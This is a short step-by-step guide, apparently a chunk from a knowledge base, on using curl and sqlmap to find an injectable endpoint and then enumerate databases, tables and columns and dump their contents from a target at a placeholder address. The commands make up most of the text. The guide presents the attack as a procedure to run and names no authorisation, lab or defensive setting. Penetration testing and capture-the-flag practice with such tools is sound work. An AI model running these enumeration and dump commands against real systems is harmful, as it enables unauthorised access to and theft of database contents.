# sql injection
<chunk>

This guide explains how to use **sqlmap** to perform SQL injection in order to retrieve data from a target database step-by-step.

---

### Step 1: Analyze the Webpage

* Use a tool like `curl` to fetch the webpage content:

  * For HTTP:

    ```bash
    curl http://<ip>:<port>
    ```
  * For HTTPS:

    ```bash
    curl https://<ip>:<port>
    ```
* Look for database-related paths or endpoints in the HTML or JavaScript code, such as URLs ending with `.php`, `.asp`, or similar.
* If you cannot find any database-related URLs or parameters, SQL injection may not be possible.

---

### Step 2: Attempt to Retrieve Databases

* Use sqlmap to test the URL and try to list databases:

  ```bash
  sqlmap -u 'http://<ip>:<port>/path' --data='username=admin' --method=POST --dbs --batch
  ```
* Replace `<ip>`, `<port>`, and `/path` accordingly.
* The value `admin` is arbitrary and can be anything; if injection is successful, the value is irrelevant.
* If no databases are returned, the target may not be vulnerable.

---

### Step 3: Attempt to Retrieve Tables in a Database

* Once you have a database name from Step 2, try to list its tables:

  ```bash
  sqlmap -u 'http://<ip>:<port>/path' --data='username=admin' --method=POST -D <database_name> --tables --batch
  ```
* Replace `<database_name>` with the database obtained previously.
* Try different databases if multiple are found, especially user-created ones.
* If no tables are found, try switching databases or check the injection again.

---

### Step 4: Attempt to Retrieve Columns in a Table

* After obtaining table names, retrieve their columns:

  ```bash
  sqlmap -u 'http://<ip>:<port>/path' --data='username=admin' --method=POST -D <database_name> -T <table_name> --columns --batch
  ```
* Replace `<table_name>` with the target table.
* Explore different tables if necessary.
* If no columns appear, try different tables or databases.

---

### Step 5: Retrieve Table Contents

* Once you know the columns, dump their content:

  ```bash
  sqlmap -u 'http://<ip>:<port>/path' --data='username=admin' --method=POST -D <database_name> -T <table_name> -C <column_name> --dump --batch
  ```
* Replace `<column_name>` with the column(s) you want to extract.
* You can try multiple columns separated by commas.
* Explore different columns and tables for useful data.

</chunk>


